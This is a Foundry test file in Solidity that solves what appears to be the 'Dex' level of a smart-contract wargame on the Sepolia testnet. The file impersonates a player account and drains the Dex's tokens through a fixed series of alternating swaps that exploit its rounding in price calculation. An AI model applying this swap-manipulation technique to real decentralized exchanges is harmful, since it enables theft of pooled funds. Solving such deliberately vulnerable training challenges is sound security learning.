// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Dex} from "../src/level22/Dex.sol";

contract level22 is Test {
    Dex dex = Dex(0x45888e1C953b288a0962Da26D74EfaD2e9E2aBdE);

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testlevel22Exploit() public {
        address user = 0xa659D686d7D696D496BeB0b781AB4734A4673294;
        address token1 = dex.token1();
        address token2 = dex.token2();
        vm.startPrank(user);
        dex.approve(address(dex), type(uint).max);

        console.log("Token1: ", dex.balanceOf(token1, user));
        console.log("Token2: ", dex.balanceOf(token2, user));
        console.log("Dex Token1: ", dex.balanceOf(token1, address(dex)));
        console.log("Dex Token2: ", dex.balanceOf(token2, address(dex)));

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);

        console.log("Token1: ", dex.balanceOf(token1, user));
        console.log("Token2: ", dex.balanceOf(token2, user));
        console.log("Dex Token1: ", dex.balanceOf(token1, address(dex)));
        console.log("Dex Token2: ", dex.balanceOf(token2, address(dex)));

        vm.stopPrank();
    }
}
